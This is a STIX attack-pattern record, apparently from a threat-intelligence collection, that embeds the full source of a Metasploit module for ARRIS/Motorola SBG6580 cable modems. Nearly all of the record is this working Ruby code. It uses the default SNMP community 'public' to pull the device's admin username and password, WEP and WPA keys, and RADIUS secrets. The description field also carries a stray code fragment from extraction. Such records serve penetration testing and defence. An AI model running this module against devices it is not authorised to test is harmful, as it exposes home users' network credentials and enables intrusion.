{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7b0b5d5f-79fd-461f-bf3b-367bd831f299",
    "created": "2024-08-14T16:27:47.691911Z",
    "modified": "2024-08-14T16:27:47.691915Z",
    "name": "ARRIS / Motorola SBG6580 Cable Modem SNMP Enumeration Module",
    "description": "This module allows SNMP enumeration of the ARRIS / Motorola SURFboard SBG6580 Series Wi-Fi Cable Modem Gateway. It supports the username and password for the device user interface as well as wireless network keys and information. The default community used is \"public\".' 'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/snmp/sbg6580_enum.rb",
            "external_id": "sbg6580_enum.rb"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20150206092553/http://www.arrisi.com/modems/datasheet/SBG6580/SBG6580_UserGuide.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SNMPClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'ARRIS / Motorola SBG6580 Cable Modem SNMP Enumeration Module',\n      'Description' => 'This module allows SNMP enumeration of the ARRIS / Motorola\n        SURFboard SBG6580 Series Wi-Fi Cable Modem Gateway. It supports the username\n        and password for the device user interface as well as wireless network keys\n        and information.\n        The default community used is \"public\".',\n      'References'  =>\n        [\n          [ 'URL', 'https://seclists.org/fulldisclosure/2014/May/79' ],\n          [ 'URL', 'https://web.archive.org/web/20150206092553/http://www.arrisi.com/modems/datasheet/SBG6580/SBG6580_UserGuide.pdf' ],\n          [ 'OSVDB', '110555' ]\n        ],\n      'Author'      => 'Matthew Kienow <mkienow[at]inokii.com>',\n      'License'     => MSF_LICENSE\n    ))\n\n    # change SNMP version option to match device specification\n    register_options(\n      [\n        OptString.new('VERSION', [ true, 'SNMP Version <1/2c>', '2c' ])\n      ])\n  end\n\n  def run_host(ip)\n\n    begin\n      snmp = connect_snmp\n\n      # represents the order of the output data fields\n      fields_order = [\n        \"Host IP\", \"Username\", \"Password\", \"SSID\", \"802.11 Band\",\n        \"Network Authentication Mode\", \"WEP Passphrase\", \"WEP Encryption\",\n        \"WEP Key 1\", \"WEP Key 2\", \"WEP Key 3\", \"WEP Key 4\",\n        \"Current Network Key\", \"WPA Encryption\", \"WPA Pre-Shared Key (PSK)\",\n        \"RADIUS Server\", \"RADIUS Port\", \"RADIUS Key\"\n      ]\n\n      output_data = {\"Host IP\" => ip}\n\n      sys_descr = snmp.get_value('sysDescr.0')\n      if is_valid_snmp_value(sys_descr) and sys_descr.to_s =~ /SBG6580/\n        # print connected status after the first query so if there are\n        # any timeout or connectivity errors; the code would already\n        # have jumped to error handling where the error status is\n        # already being displayed.\n        print_good(\"#{ip}, Connected.\")\n\n        # attempt to get the username and password for the device user interface\n        # using the CableHome cabhPsDevMib MIB module which defines the\n        # basic management objects for the Portal Services (PS) logical element\n        # of a CableHome compliant Residential Gateway device\n        device_ui_selection = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.3.0')\n        if is_valid_snmp_value(device_ui_selection) and device_ui_selection.to_i == 1\n          # manufacturerLocal(1) - indicates Portal Services is using the vendor\n          # web user interface shipped with the device\n          device_ui_username = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0')\n          if is_valid_snmp_value(device_ui_username)\n            output_data[\"Username\"] = device_ui_username.to_s\n          end\n\n          device_ui_password = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0')\n          if is_valid_snmp_value(device_ui_password)\n            output_data[\"Password\"] = device_ui_password.to_s\n          end\n        end\n\n        wifi_ifindex = get_primary_wifi_ifindex(snmp)\n        if wifi_ifindex < 1\n          print_status(\"Primary WiFi is disabled on the device\")\n        end\n\n        ssid = snmp.get_value(\"1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.#{wifi_ifindex}\")\n        if is_valid_snmp_value(ssid)\n          output_data[\"SSID\"] = ssid.to_s\n        end\n\n        wireless_band = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.1.18.0')\n        if is_valid_snmp_value(wireless_band)\n          output_data[\"802.11 Band\"] = get_wireless_band_name(wireless_band.to_i)\n        end\n\n        network_auth_mode = snmp.get_value(\"1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.5.#{wifi_ifindex}\")\n        if is_valid_snmp_value(network_auth_mode)\n          network_auth_mode = network_auth_mode.to_i\n          network_auth_mode_name = get_network_auth_mode_name(network_auth_mode)\n          output_data[\"Network Authentication Mode\"] = network_auth_mode_name\n        end\n\n        case network_auth_mode\n        when 1, 6\n          # WEP, WEP 802.1x Authentication\n          wep_passphrase = snmp.get_value(\"1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.3.#{wifi_ifindex}\")\n          if is_valid_snmp_value(wep_passphrase)\n            output_data[\"WEP Passphrase\"] = wep_passphrase.to_s\n          end\n\n          wep_encryption = snmp.get_value(\"1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.2.#{wifi_ifindex}\")\n          if is_valid_snmp_value(wep_encryption)\n            wep_encryption = wep_encryption.to_i\n          else\n            wep_encryption = -1\n          end\n\n          wep_encryption_name = \"Unknown\"\n          wep_key1 = wep_key2 = wep_key3 = wep_key4 = nil\n          # get appropriate WEP keys based on wep_encryption setting\n          if wep_encryption == 1\n            wep_encryption_name = \"64-bit\"\n            wep_key1 = snmp.get_value(\"1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.#{wifi_ifindex}.1\")\n            wep_key2 = snmp.get_value(\"1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.#{wifi_ifindex}.2\")\n            wep_key3 = snmp.get_value(\"1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.#{wifi_ifindex}.3\")\n            wep_key4 = snmp.get_value(\"1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.#{wifi_ifindex}.4\")\n          elsif wep_encryption == 2\n            wep_encryption_name = \"128-bit\"\n            wep_key1 = snmp.get_value(\"1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.#{wifi_ifindex}.1\")\n            wep_key2 = snmp.get_value(\"1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.#{wifi_ifindex}.2\")\n            wep_key3 = snmp.get_value(\"1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.#{wifi_ifindex}.3\")\n            wep_key4 = snmp.get_value(\"1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.#{wifi_ifindex}.4\")\n          end\n\n          output_data[\"WEP Encryption\"] = wep_encryption_name\n          if is_valid_snmp_value(wep_key1)\n            output_data[\"WEP Key 1\"] = wep_key1.unpack('H*')[0]\n          end\n          if is_valid_snmp_value(wep_key2)\n            output_data[\"WEP Key 2\"] = wep_key2.unpack('H*')[0]\n          end\n          if is_valid_snmp_value(wep_key3)\n            output_data[\"WEP Key 3\"] = wep_key3.unpack('H*')[0]\n          end\n          if is_valid_snmp_value(wep_key4)\n            output_data[\"WEP Key 4\"] = wep_key4.unpack('H*')[0]\n          end\n\n          # get current network key\n          current_key = snmp.get_value(\"1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.1.#{wifi_ifindex}\")\n          if is_valid_snmp_value(current_key)\n            output_data[\"Current Network Key\"] = current_key.to_s\n          end\n\n          if network_auth_mode == 6\n            get_radius_info(snmp, wifi_ifindex, output_data)\n          end\n\n        when 2, 3, 4, 5, 7, 8\n          # process all flavors of WPA\n          wpa_encryption = snmp.get_value(\"1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.1.#{wifi_ifindex}\")\n          if is_valid_snmp_value(wpa_encryption)\n            output_data[\"WPA Encryption\"] = get_wpa_encryption_name(wpa_encryption.to_i)\n          end\n\n          wpa_psk = snmp.get_value(\"1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.2.#{wifi_ifindex}\")\n          if is_valid_snmp_value(wpa_psk)\n            output_data[\"WPA Pre-Shared Key (PSK)\"] = wpa_psk.to_s\n          end\n\n          case network_auth_mode\n          when 4, 5, 8\n            get_radius_info(snmp, wifi_ifindex, output_data)\n          end\n        end\n\n        # output\n        print_line(\"\")\n        print_status(\"Device information:\\n\")\n        line = \"\"\n        width = 30  # name field width\n\n        fields_order.each {|k|\n          if not output_data.has_key?(k)\n            next\n          end\n\n          v = output_data[k]\n          if (v.nil? or v.empty? or v =~ /Null/)\n            v = '-'\n          end\n\n          report_note(\n            :host  => ip,\n            :proto => 'udp',\n            :sname => 'snmp',\n            :port  => datastore['RPORT'].to_i,\n            :type  => \"snmp.#{k}\",\n            :data  => v\n          )\n\n          line << sprintf(\"%s%s: %s\\n\", k, \" \"*([0,width-k.length].max), v)\n        }\n\n        print_line(line)\n      else\n        print_error(\"#{ip} does not appear to be a SBG6580.\")\n      end\n\n    rescue SNMP::RequestTimeout\n      print_error(\"#{ip} SNMP request timeout.\")\n    rescue Rex::ConnectionError\n      print_error(\"#{ip} Connection refused.\")\n    rescue SNMP::InvalidIpAddress\n      print_error(\"#{ip} Invalid IP Address. Check it with 'snmpwalk tool'.\")\n    rescue SNMP::UnsupportedVersion\n      print_error(\"#{ip} Unsupported SNMP version specified. Select from '1' or '2c'.\")\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception => e\n      print_error(\"Unknown error: #{e.class} #{e}\")\n      elog(e)\n    ensure\n      disconnect_snmp\n    end\n  end\n\n  def get_primary_wifi_ifindex(snmp)\n    # The ifTable contains interface entries where each row represents\n    # management information for a particular interface. Locate the first\n    # interface where ifType is 71 (ieee80211) and ifAdminStatus is 1 (up).\n    wifi_ifindex = 0\n    ifTable_columns = [\"ifIndex\", \"ifDescr\", \"ifType\", \"ifAdminStatus\"]\n    snmp.walk(ifTable_columns) do |ifIndex, ifDescr, ifType, ifAdminStatus|\n      if (wifi_ifindex < 1 and ifType.value == 71 and ifAdminStatus.value == 1)\n        wifi_ifindex = ifIndex.value.to_i\n      end\n    end\n    wifi_ifindex\n  end\n\n  def is_valid_snmp_value(value)\n    if value.nil? or value.to_s =~ /Null/ or value.to_s =~ /^noSuch/\n      return false\n    end\n    return true\n  end\n\n  def get_network_auth_mode_name(network_auth_mode)\n    case network_auth_mode\n    when 0\n      \"Open Security\"\n    when 1\n      \"WEP\"\n    when 2\n      \"WPA-PSK\"\n    when 3\n      \"WPA2-PSK\"\n    when 4\n      \"WPA RADIUS\"\n    when 5\n      \"WPA2 RADIUS\"\n    when 6\n      \"WEP 802.1x Authentication\"\n    when 7\n      \"WPA-PSK and WPA2-PSK\"\n    when 8\n      \"WPA and WPA2 RADIUS\"\n    else\n      \"Unknown\"\n    end\n  end\n\n  def get_wireless_band_name(wireless_band)\n    case wireless_band\n    when 1\n      \"2.4 Ghz\"\n    when 2\n      \"5 Ghz\"\n    else\n      \"Unknown\"\n    end\n  end\n\n  def get_wpa_encryption_name(wpa_encryption)\n    case wpa_encryption\n    when 2\n      \"AES\"\n    when 3\n      \"TKIP+AES\"\n    else\n      \"Unknown\"\n    end\n  end\n\n  def get_radius_info(snmp, wifi_ifindex, output_data)\n    radius_server = snmp.get_value(\"1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.2.#{wifi_ifindex}\")\n    if is_valid_snmp_value(radius_server)\n      output_data[\"RADIUS Server\"] = radius_server.unpack(\"C4\").join(\".\")\n    end\n\n    radius_port = snmp.get_value(\"1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.3.#{wifi_ifindex}\")\n    if is_valid_snmp_value(radius_port)\n      output_data[\"RADIUS Port\"] = radius_port.to_s.strip\n    end\n\n    radius_key = snmp.get_value(\"1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.4.#{wifi_ifindex}\")\n    if is_valid_snmp_value(radius_key)\n      output_data[\"RADIUS Key\"] = radius_key.to_s\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "Matthew Kienow <mkienow[at]inokii.com>",
        ""
    ]
}